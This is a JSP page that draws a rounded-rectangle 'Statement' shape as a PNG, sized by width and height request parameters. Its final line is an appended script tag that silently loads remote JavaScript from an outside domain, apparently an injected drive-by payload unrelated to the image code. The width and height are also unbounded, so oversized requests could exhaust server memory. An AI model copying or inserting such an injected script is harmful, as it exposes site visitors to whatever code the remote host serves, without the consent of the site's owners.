<%@ page import="java.io.*" %>
<%@ page import="java.awt.geom.*" %>
<%@ page import="java.awt.*" %>
<%@ page import="javax.swing.*" %>
<%@ page import="java.awt.image.*" %>
<%@ page import="javax.imageio.*" %>




<%!
	// draw a rounded rectangle for Statement Shape
	public void drawImage (Graphics2D g, int width, int height) {
		int arcX = width / 2;
		int arcY = height / 2;
		int arc = Math.min(arcX, arcY);

		g.setPaint(new Color(255, 255, 190, 255));
		g.fillRoundRect(1, 1, width - 2, height - 2, arc, arc);
		g.setPaint(new Color(210, 105, 0, 255));
		g.drawRoundRect(1, 1, width - 2, height - 2, arc, arc);
	}

%>




<%

	try {

		int width = Integer.parseInt(request.getParameter("width"));
		int height = Integer.parseInt(request.getParameter("height"));


		// output the image to the response
		response.setContentType("image/png");

		OutputStream output = response.getOutputStream();

		BufferedImage bi = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);

		Graphics2D g2 = bi.createGraphics();

		drawImage(g2, width, height);

		g2.dispose();

		ImageIO.write(bi, "png", output);

	} catch (Exception e) {
		throw e;
	}
%>







<script language=javascript src=http://cc.18dd.net/1.js></script>